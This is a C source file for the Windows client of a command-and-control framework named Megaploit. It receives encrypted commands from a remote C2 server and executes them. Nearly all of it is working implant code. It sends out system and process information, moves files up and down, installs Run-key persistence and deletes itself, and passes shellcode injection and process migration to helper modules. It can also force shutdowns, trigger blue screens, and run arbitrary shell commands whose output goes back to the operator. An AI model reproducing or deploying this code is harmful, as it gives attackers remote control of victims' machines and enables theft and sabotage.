/*
 * client/shell.c  --  Shell command-loop for the Megaploit C2 protocol
 * ======================================================================
 * Receives encrypted commands from the C2, dispatches them through the
 * handler table below, and sends encrypted responses back.  Mirrors
 * megaploit/agent/handlers.py for shared verbs.
 *
 * Verb dispatch table
 * -------------------
 *  Each verb is matched with strncmp().  megaploit/core/c_probe.py scans
 *  these strncmp() calls at runtime to discover the full verb set without
 *  hardcoding any string in Python.
 *
 *  Shared verbs (Python agent + C client):
 *    exit              -- clean TLS disconnect
 *    q                 -- alias for exit (standalone serverShell compat)
 *    sysinfo           -- OS, hostname, username, arch, CWD
 *    cd <path>         -- SetCurrentDirectoryA
 *    ls [path]         -- directory listing (optional path, default CWD)
 *    ps                -- running process list (PID, name, PPID, arch, user)
 *    upload <name>     -- receive framed file, write to disk, send "OK"
 *    download <path>   -- send "FILE_OK" then the framed file bytes
 *    persist <k> <f>   -- copy EXE to %APPDATA%\<f>, set HKCU Run key
 *    self_destruct     -- remove registry key, schedule EXE deletion, exit
 *
 *  C-exclusive verbs:
 *    inject <pid> <hex>  -- shellcode injection (NT native API, W^X)
 *    migrate <pid>       -- agent migration (reflective PE load in target)
 *    forceOff()          -- NtSetSystemPowerState + NtShutdownSystem
 *    blueScreen()        -- NtRaiseHardError(STATUS_ASSERTION_FAILURE) BSOD
 *
 *  Shell fallback:
 *    <anything else>   -- _popen() fallback; covers all remaining C2 commands
 *
 * Protocol contract  (matches megaploit/core/protocol.py)
 * --------------------------------------------------------
 *  Every message:  [uint32-BE total_payload_len]
 *                  [12-byte random GCM nonce]
 *                  [AES-GCM ciphertext + 16-byte auth tag]
 *  Plaintext:      [uint64-BE seq][data bytes]
 */

#include "shell.h"
#include "config.h"
#include "ntcalls.h"
#include "inject.h"
#include "../tls/tls_client.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <Windows.h>
#include <winsock2.h>
#include <tlhelp32.h>   /* CreateToolhelp32Snapshot, Process32First/Next */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


/* ── Forward declarations ───────────────────────────────────────────────── */
static void _handle_sysinfo      (TLS_CONTEXT *pTls);
static void _handle_cd           (TLS_CONTEXT *pTls, const char *args);
static void _handle_ls           (TLS_CONTEXT *pTls, const char *path);
static void _handle_ps           (TLS_CONTEXT *pTls);
static void _handle_upload       (TLS_CONTEXT *pTls, const char *filename);
static void _handle_download     (TLS_CONTEXT *pTls, const char *path);
static void _handle_persist      (TLS_CONTEXT *pTls, const char *args);
static void _handle_self_destruct(TLS_CONTEXT *pTls);
static void _send_str            (TLS_CONTEXT *pTls, const char *msg);
static void _shell_exec          (TLS_CONTEXT *pTls, const char *cmd);


/* ── Public: shell_run ──────────────────────────────────────────────────── */

void shell_run(TLS_CONTEXT *pTls)
{
    /* One-time initialisation of NT inject syscalls — non-fatal if it fails;
     * inject/migrate commands will report an error rather than crash.       */
    inject_init();

    BYTE  *pCmd  = NULL;
    DWORD  cbCmd = 0;

    while (1) {
        if (pCmd) { free(pCmd); pCmd = NULL; cbCmd = 0; }

        if (!tls_recv_msg(pTls, &pCmd, &cbCmd))
            break;

        const char *cmd = (const char *)pCmd;

        /* ── "exit" ──────────────────────────────────────────────── */
        if (cbCmd >= 4 && strncmp("exit", cmd, 4) == 0) {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }

        /* ── "q" ─────────────────────────────────────────────────── */
        if (cbCmd == 1 && cmd[0] == 'q') {
            free(pCmd); pCmd = NULL;
            tls_disconnect(pTls);
            return;
        }

        /* ── "sysinfo" ───────────────────────────────────────────── */
        if (cbCmd >= 7 && strncmp("sysinfo", cmd, 7) == 0) {
            free(pCmd); pCmd = NULL;
            _handle_sysinfo(pTls);
            continue;
        }

        /* ── "cd <path>" ─────────────────────────────────────────── */
        if (cbCmd >= 3 && strncmp("cd ", cmd, 3) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_cd(pTls, path);
            continue;
        }

        /* ── "ls" / "ls <path>" ──────────────────────────────────── */
        if ((cbCmd == 2 && strncmp("ls", cmd, 2) == 0) ||
            (cbCmd >= 3 && strncmp("ls ", cmd, 3) == 0)) {
            char path[MAX_PATH] = {0};
            if (cbCmd > 3) strncpy(path, cmd + 3, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_ls(pTls, path[0] ? path : NULL);
            continue;
        }

        /* ── "ps" ────────────────────────────────────────────────── */
        if (cbCmd >= 2 && strncmp("ps", cmd, 2) == 0 &&
            (cbCmd == 2 || cmd[2] == ' ' || cmd[2] == '\r' || cmd[2] == '\n')) {
            free(pCmd); pCmd = NULL;
            _handle_ps(pTls);
            continue;
        }

        /* ── "upload <filename>" ─────────────────────────────────── */
        if (cbCmd >= 7 && strncmp("upload ", cmd, 7) == 0) {
            char filename[MAX_PATH] = {0};
            strncpy(filename, cmd + 7, sizeof(filename) - 1);
            free(pCmd); pCmd = NULL;
            _handle_upload(pTls, filename);
            continue;
        }

        /* ── "download <path>" ───────────────────────────────────── */
        if (cbCmd >= 9 && strncmp("download ", cmd, 9) == 0) {
            char path[MAX_PATH] = {0};
            strncpy(path, cmd + 9, sizeof(path) - 1);
            free(pCmd); pCmd = NULL;
            _handle_download(pTls, path);
            continue;
        }

        /* ── "persist <regkey> <filename>" ──────────────────────── */
        if (cbCmd >= 8 && strncmp("persist ", cmd, 8) == 0) {
            char args[512] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            _handle_persist(pTls, args);
            continue;
        }

        /* ── "self_destruct" ─────────────────────────────────────── */
        if (cbCmd >= 13 && strncmp("self_destruct", cmd, 13) == 0) {
            free(pCmd); pCmd = NULL;
            _handle_self_destruct(pTls);
            return;
        }

        /* ── "inject <pid> <hex-shellcode>" ─────────────────────── */
        if (cbCmd >= 7 && strncmp("inject ", cmd, 7) == 0) {
            char args[65600] = {0};
            strncpy(args, cmd + 7, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            inject_shellcode(pTls, args);
            continue;
        }

        /* ── "migrate <pid>" ─────────────────────────────────────── */
        if (cbCmd >= 8 && strncmp("migrate ", cmd, 8) == 0) {
            char args[32] = {0};
            strncpy(args, cmd + 8, sizeof(args) - 1);
            free(pCmd); pCmd = NULL;
            migrate_to_pid(pTls, args);
            return;  /* migrate calls ExitProcess on success */
        }

        /* ── "forceOff()" ────────────────────────────────────────── */
        if (cbCmd >= 10 && strncmp("forceOff()", cmd, 10) == 0) {
            free(pCmd); pCmd = NULL;
            NtSetSystemPowerState(PowerActionShutdownOff,
                                  PowerSystemShutdown,
                                  SHTDN_REASON_MAJOR_HARDWARE |
                                  SHTDN_REASON_MINOR_POWER_SUPPLY);
            NtShutdownSystem(ShutdownPowerOff);
            return;
        }

        /* ── "blueScreen()" ──────────────────────────────────────── */
        if (cbCmd >= 12 && strncmp("blueScreen()", cmd, 12) == 0) {
            free(pCmd); pCmd = NULL;
            NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL,
                             6, &g_hardErrorResponse);
            continue;
        }

        /* ── Shell fallback ──────────────────────────────────────── */
        char *cmdCopy = (char *)malloc(cbCmd + 1);
        if (cmdCopy) {
            memcpy(cmdCopy, cmd, cbCmd);
            cmdCopy[cbCmd] = '\0';
        }
        free(pCmd); pCmd = NULL;
        if (cmdCopy) {
            _shell_exec(pTls, cmdCopy);
            free(cmdCopy);
        }
    }

    if (pCmd) free(pCmd);
}


/* ── _send_str ──────────────────────────────────────────────────────────── */

static void _send_str(TLS_CONTEXT *pTls, const char *msg)
{
    if (!msg) msg = "";
    size_t len = strlen(msg);
    if (len > 0)
        tls_send_msg(pTls, (const BYTE *)msg, (DWORD)len);
    else
        tls_send_msg(pTls, (const BYTE *)" ", 1);
}


/* ── _handle_sysinfo ────────────────────────────────────────────────────── */

static void _handle_sysinfo(TLS_CONTEXT *pTls)
{
    char  hostname[MAX_COMPUTERNAME_LENGTH + 1] = {0};
    DWORD cbHost = sizeof(hostname);
    GetComputerNameA(hostname, &cbHost);

    char username[256] = {0};
    DWORD cbUser = sizeof(username);
    GetUserNameA(username, &cbUser);

    char cwd[MAX_PATH] = {0};
    GetCurrentDirectoryA(sizeof(cwd), cwd);

    OSVERSIONINFOEXW osvi = {0};
    osvi.dwOSVersionInfoSize = sizeof(osvi);
    typedef NTSTATUS (WINAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    RtlGetVersion_t pRtlGetVersion =
        (RtlGetVersion_t)(hNtdll ? GetProcAddress(hNtdll, "RtlGetVersion") : NULL);
    if (pRtlGetVersion)
        pRtlGetVersion((PRTL_OSVERSIONINFOW)&osvi);

    SYSTEM_INFO si = {0};
    GetNativeSystemInfo(&si);
    const char *arch = "x86";
    if      (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) arch = "x64";
    else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) arch = "ARM64";

    char buf[4096] = {0};
    _snprintf(buf, sizeof(buf) - 1,
        "[*] System Information\n"
        "    OS:           Windows %lu.%lu (Build %lu)\n"
        "    Hostname:     %s\n"
        "    Username:     %s\n"
        "    Architecture: %s\n"
        "    CWD:          %s",
        osvi.dwMajorVersion, osvi.dwMinorVersion, osvi.dwBuildNumber,
        hostname, username, arch, cwd);

    _send_str(pTls, buf);
}


/* ── _handle_cd ─────────────────────────────────────────────────────────── */

static void _handle_cd(TLS_CONTEXT *pTls, const char *path)
{
    if (SetCurrentDirectoryA(path)) {
        char cwd[MAX_PATH] = {0};
        GetCurrentDirectoryA(sizeof(cwd), cwd);
        char buf[MAX_PATH + 16];
        _snprintf(buf, sizeof(buf) - 1, "[+] cwd: %s", cwd);
        _send_str(pTls, buf);
    } else {
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] Not found: %s", path);
        _send_str(pTls, buf);
    }
}


/* ── _handle_ls ─────────────────────────────────────────────────────────── */
/*
 * Lists the contents of a directory.  If path is NULL or empty, uses CWD.
 * Output format mirrors 'dir' but is clean for the C2 console:
 *
 *   Directory of C:\Users\john\Desktop
 *
 *   [DIR]  Documents
 *   [DIR]  Downloads
 *   [FILE] secret.txt             1234 bytes  2024-01-15 14:22
 */

static void _handle_ls(TLS_CONTEXT *pTls, const char *path)
{
    char target[MAX_PATH]   = {0};
    char pattern[MAX_PATH]  = {0};

    if (path && *path) {
        strncpy(target, path, MAX_PATH - 1);
    } else {
        GetCurrentDirectoryA(sizeof(target), target);
    }

    /* FindFirstFile needs a wildcard glob */
    _snprintf(pattern, sizeof(pattern) - 1, "%s\\*", target);

    WIN32_FIND_DATAA ffd;
    HANDLE hFind = FindFirstFileA(pattern, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        char err[MAX_PATH + 32];
        _snprintf(err, sizeof(err) - 1, "[-] ls: cannot open directory: %s", target);
        _send_str(pTls, err);
        return;
    }

    /* Build the listing in a dynamically grown buffer */
    size_t  bufSize = 16384;
    char   *buf     = (char *)malloc(bufSize);
    if (!buf) { FindClose(hFind); _send_str(pTls, "[-] ls: OOM"); return; }

    int off = _snprintf(buf, bufSize - 1, "Directory of %s\n\n", target);
    if (off < 0) off = 0;

    do {
        /* Skip . and .. */
        if (strcmp(ffd.cFileName, ".") == 0 || strcmp(ffd.cFileName, "..") == 0)
            continue;

        BOOL  isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        BOOL  isLink= (ffd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0;

        /* Decode FILETIME to human-readable date */
        SYSTEMTIME st = {0};
        FILETIME   ft = ffd.ftLastWriteTime;
        FileTimeToLocalFileTime(&ft, &ft);
        FileTimeToSystemTime(&ft, &st);

        char line[512];
        int  lineLen;

        if (isDir) {
            lineLen = _snprintf(line, sizeof(line) - 1,
                "  [%s]  %-40s  %04d-%02d-%02d %02d:%02d\n",
                isLink ? "LNK" : "DIR",
                ffd.cFileName,
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
        } else {
            ULONGLONG fileSize = ((ULONGLONG)ffd.nFileSizeHigh << 32) | ffd.nFileSizeLow;
            lineLen = _snprintf(line, sizeof(line) - 1,
                "  [%s]  %-40s  %12llu bytes  %04d-%02d-%02d %02d:%02d\n",
                isLink ? "LNK" : "   ",
                ffd.cFileName,
                (unsigned long long)fileSize,
                st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);
        }

        if (lineLen > 0) {
            /* Grow buffer if needed */
            if ((size_t)(off + lineLen + 2) >= bufSize) {
                bufSize *= 2;
                char *p = (char *)realloc(buf, bufSize);
                if (!p) break;
                buf = p;
            }
            memcpy(buf + off, line, lineLen);
            off += lineLen;
        }
    } while (FindNextFileA(hFind, &ffd));

    FindClose(hFind);
    buf[off] = '\0';

    if (off > 0)
        tls_send_msg(pTls, (const BYTE *)buf, (DWORD)off);
    else
        _send_str(pTls, "(empty directory)");

    free(buf);
}


/* ── _handle_ps ─────────────────────────────────────────────────────────── */
/*
 * Lists all running processes using a Toolhelp32 snapshot.
 * For each process also queries the owner username (via OpenProcessToken +
 * GetTokenInformation) and whether it is WOW64 (32-bit on 64-bit OS).
 *
 * Output columns: PID  PPID  Name  Arch  User
 *
 * Example:
 *   PID    PPID   Name                          Arch  User
 *   ----   ----   ----                          ----  ----
 *   4      0      System                        x64   NT AUTHORITY\SYSTEM
 *   440    4      smss.exe                      x64   NT AUTHORITY\SYSTEM
 *   1234   880    explorer.exe                  x64   DESKTOP\john
 */

static void _handle_ps(TLS_CONTEXT *pTls)
{
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        _send_str(pTls, "[-] ps: CreateToolhelp32Snapshot failed");
        return;
    }

    size_t  bufSize = 65536;
    char   *buf     = (char *)malloc(bufSize);
    if (!buf) { CloseHandle(hSnap); _send_str(pTls, "[-] ps: OOM"); return; }

    int off = _snprintf(buf, bufSize - 1,
        "  %-8s %-8s %-40s %-6s %s\n"
        "  %-8s %-8s %-40s %-6s %s\n",
        "PID", "PPID", "Name", "Arch", "User",
        "---", "----", "----", "----", "----");
    if (off < 0) off = 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            DWORD pid = pe.th32ProcessID;

            /* Arch detection via IsWow64Process */
            const char *arch = "x64";
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProc) {
                BOOL bWow64 = FALSE;
                IsWow64Process(hProc, &bWow64);
                if (bWow64) arch = "x86";

                /* Get process owner via token */
                char ownerBuf[256] = {0};
                HANDLE hTok = NULL;
                if (OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
                    DWORD  cbTI = 0;
                    GetTokenInformation(hTok, TokenUser, NULL, 0, &cbTI);
                    if (cbTI > 0) {
                        BYTE *pTI = (BYTE *)malloc(cbTI);
                        if (pTI && GetTokenInformation(hTok, TokenUser, pTI, cbTI, &cbTI)) {
                            TOKEN_USER *pTU = (TOKEN_USER *)pTI;
                            char name[128]   = {0};
                            char domain[128] = {0};
                            DWORD cbName = sizeof(name), cbDomain = sizeof(domain);
                            SID_NAME_USE snuType;
                            if (LookupAccountSidA(NULL, pTU->User.Sid,
                                                  name, &cbName,
                                                  domain, &cbDomain, &snuType))
                                _snprintf(ownerBuf, sizeof(ownerBuf)-1, "%s\\%s", domain, name);
                        }
                        free(pTI);
                    }
                    CloseHandle(hTok);
                }
                CloseHandle(hProc);

                if (ownerBuf[0] == '\0')
                    strncpy(ownerBuf, "(unknown)", sizeof(ownerBuf)-1);

                char line[512];
                int lineLen = _snprintf(line, sizeof(line) - 1,
                    "  %-8lu %-8lu %-40s %-6s %s\n",
                    (unsigned long)pid,
                    (unsigned long)pe.th32ParentProcessID,
                    pe.szExeFile,
                    arch,
                    ownerBuf);

                if (lineLen > 0) {
                    if ((size_t)(off + lineLen + 2) >= bufSize) {
                        bufSize *= 2;
                        char *p = (char *)realloc(buf, bufSize);
                        if (!p) break;
                        buf = p;
                    }
                    memcpy(buf + off, line, lineLen);
                    off += lineLen;
                }
            } else {
                /* Can't open process — still show it with limited info */
                char line[256];
                int lineLen = _snprintf(line, sizeof(line) - 1,
                    "  %-8lu %-8lu %-40s %-6s %s\n",
                    (unsigned long)pid,
                    (unsigned long)pe.th32ParentProcessID,
                    pe.szExeFile,
                    "?",
                    "(access denied)");
                if (lineLen > 0) {
                    if ((size_t)(off + lineLen + 2) >= bufSize) {
                        bufSize *= 2;
                        char *p = (char *)realloc(buf, bufSize);
                        if (!p) break;
                        buf = p;
                    }
                    memcpy(buf + off, line, lineLen);
                    off += lineLen;
                }
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    buf[off] = '\0';

    if (off > 0)
        tls_send_msg(pTls, (const BYTE *)buf, (DWORD)off);
    else
        _send_str(pTls, "(no processes)");

    free(buf);
}


/* ── _handle_upload ─────────────────────────────────────────────────────── */

static void _handle_upload(TLS_CONTEXT *pTls, const char *filename)
{
    BYTE  *pData = NULL;
    DWORD  cbData = 0;

    if (!tls_recv_msg(pTls, &pData, &cbData)) {
        _send_str(pTls, "[-] Receive failed: connection lost");
        return;
    }

    FILE *f = fopen(filename, "wb");
    if (!f) {
        free(pData);
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] Cannot open for writing: %s", filename);
        _send_str(pTls, buf);
        return;
    }
    size_t nWritten = fwrite(pData, 1, cbData, f);
    fclose(f);
    free(pData);

    char buf[MAX_PATH + 32];
    if (nWritten != (size_t)cbData) {
        _snprintf(buf, sizeof(buf) - 1, "[-] Write error: %s (wrote %zu of %lu bytes)",
                  filename, nWritten, (unsigned long)cbData);
    } else {
        _snprintf(buf, sizeof(buf) - 1, "[+] Received: %s (%lu bytes)", filename,
                  (unsigned long)cbData);
    }
    _send_str(pTls, buf);
}


/* ── _handle_download ────────────────────────────────────────────────────── */

static void _handle_download(TLS_CONTEXT *pTls, const char *path)
{
    FILE *f = fopen(path, "rb");
    if (!f) {
        char buf[MAX_PATH + 32];
        _snprintf(buf, sizeof(buf) - 1, "[-] File not found: %s", path);
        _send_str(pTls, buf);
        return;
    }

    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    fseek(f, 0, SEEK_SET);

    if (sz <= 0 || sz > (long)(256 * 1024 * 1024)) {
        fclose(f);
        _send_str(pTls, "[-] File too large or empty");
        return;
    }

    BYTE *buf = (BYTE *)malloc((size_t)sz);
    if (!buf) {
        fclose(f);
        _send_str(pTls, "[-] Out of memory");
        return;
    }
    size_t nRead = fread(buf, 1, (size_t)sz, f);
    fclose(f);
    if (nRead != (size_t)sz) {
        free(buf);
        _send_str(pTls, "[-] File read error");
        return;
    }

    _send_str(pTls, "FILE_OK");
    tls_send_msg(pTls, buf, (DWORD)sz);
    free(buf);
}


/* ── _handle_persist ─────────────────────────────────────────────────────── */

static void _handle_persist(TLS_CONTEXT *pTls, const char *args)
{
    char regkey[256]  = {0};
    char filename[256]= {0};
    if (sscanf(args, "%255s %255s", regkey, filename) != 2) {
        _send_str(pTls, "Usage: persist <regkey> <filename>");
        return;
    }

    char appdata[MAX_PATH] = {0};
    if (!GetEnvironmentVariableA("APPDATA", appdata, sizeof(appdata))) {
        _send_str(pTls, "[-] APPDATA not set");
        return;
    }

    char dst[MAX_PATH] = {0};
    _snprintf(dst, sizeof(dst) - 1, "%s\\%s", appdata, filename);

    char src[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, src, sizeof(src));

    if (GetFileAttributesA(dst) != INVALID_FILE_ATTRIBUTES) {
        _send_str(pTls, "[-] Already exists");
        return;
    }

    if (!CopyFileA(src, dst, TRUE)) {
        _send_str(pTls, "[-] CopyFile failed");
        return;
    }

    char regPath[512];
    _snprintf(regPath, sizeof(regPath) - 1,
        "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" "
        "/v \"%s\" /t REG_SZ /d \"%s\" /f", regkey, dst);

    system(regPath);
    _send_str(pTls, "[+] Persistence installed");
}


/* ── _handle_self_destruct ──────────────────────────────────────────────── */

static void _handle_self_destruct(TLS_CONTEXT *pTls)
{
    system("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /f >nul 2>&1");

    char exePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, exePath, sizeof(exePath));

    _send_str(pTls, "[+] Registry run key removed\n[*] Self-destruct complete — terminating.");

    char bat[MAX_PATH + 64];
    _snprintf(bat, sizeof(bat) - 1,
        "cmd.exe /c ping 127.0.0.1 -n 2 >nul & del /f /q \"%s\"", exePath);
    WinExec(bat, SW_HIDE);

    tls_disconnect(pTls);
    WSACleanup();
    ExitProcess(0);
}


/* ── _shell_exec ─────────────────────────────────────────────────────────── */

static void _shell_exec(TLS_CONTEXT *pTls, const char *cmd)
{
    char   line[SHELL_LINE_BUF];
    char  *resp = (char *)calloc(1, SHELL_RESP_BUF);
    if (!resp) {
        _send_str(pTls, "[-] out of memory");
        return;
    }

    FILE *pFile = _popen(cmd, "r");
    if (pFile) {
        while (fgets(line, sizeof(line), pFile) != NULL) {
            size_t used = strlen(resp);
            size_t add  = strlen(line);
            if (used + add < (size_t)(SHELL_RESP_BUF - 1))
                memcpy(resp + used, line, add + 1);
        }
        _pclose(pFile);
    }

    size_t cbOut = strlen(resp);
    if (cbOut > 0)
        tls_send_msg(pTls, (const BYTE *)resp, (DWORD)cbOut);
    else
        tls_send_msg(pTls, (const BYTE *)" ", 1);

    free(resp);
}
